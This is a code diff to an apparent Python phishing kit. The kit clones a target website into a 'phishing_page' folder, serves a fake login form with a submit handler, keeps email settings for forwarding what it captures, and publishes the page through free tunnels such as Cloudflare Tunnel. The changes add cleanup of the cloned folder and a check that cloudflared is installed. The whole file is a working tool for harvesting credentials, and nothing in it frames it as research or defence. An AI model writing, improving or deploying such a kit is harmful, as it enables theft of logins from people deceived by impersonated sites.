@@ -9,6 +9,7 @@ from email.mime.text import MIMEText
 from bs4 import BeautifulSoup
 import subprocess
 import time
+import shutil
 
 # Initialize colorama
 init(autoreset=True)
@@ -60,15 +61,21 @@ EMAIL_USER = "your_email@gmail.com"
 EMAIL_PASS = "your_email_password"
 EMAIL_RECEIVER = "receiver_email@gmail.com"
 
+# Function to clear the phishing_page directory
+def clear_phishing_page_directory(output_dir):
+    if os.path.exists(output_dir):
+        shutil.rmtree(output_dir)
+    os.makedirs(output_dir)
+
 # Step 1: Clone a Website (with assets and footer)
 def clone_website(url, output_dir):
     try:
+        # Clear the phishing_page directory
+        clear_phishing_page_directory(output_dir)
+        
         # Fetch the website content
         response = requests.get(url)
         if response.status_code == 200:
-            # Create the output directory if it doesn't exist
-            os.makedirs(output_dir, exist_ok=True)
-            
             # Parse the HTML content
             soup = BeautifulSoup(response.text, "html.parser")
             
@@ -169,6 +176,16 @@ def submit():
     <p>Thank you for logging in.</p>
     """
 
+# Function to check if cloudflared is installed
+def is_cloudflared_installed():
+    try:
+        subprocess.run(["cloudflared", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        return True
+    except FileNotFoundError:
+        return False
+    except subprocess.CalledProcessError:
+        return False
+
 # Function to start a free server and generate a link
 def start_free_server(server_choice, port):
     if server_choice == "1":
@@ -207,7 +224,13 @@ def start_free_server(server_choice, port):
     elif server_choice == "7":
         # Cloudflare Tunnel
         print("Starting Cloudflare Tunnel...")
-        subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:" + str(port)])
+        if not is_cloudflared_installed():
+            print("Error: 'cloudflared' is not installed. Please install it from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation.")
+            return
+        try:
+            subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:" + str(port)], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error running cloudflared: {e}")
     else:
         print("Invalid choice. Exiting.")
         return
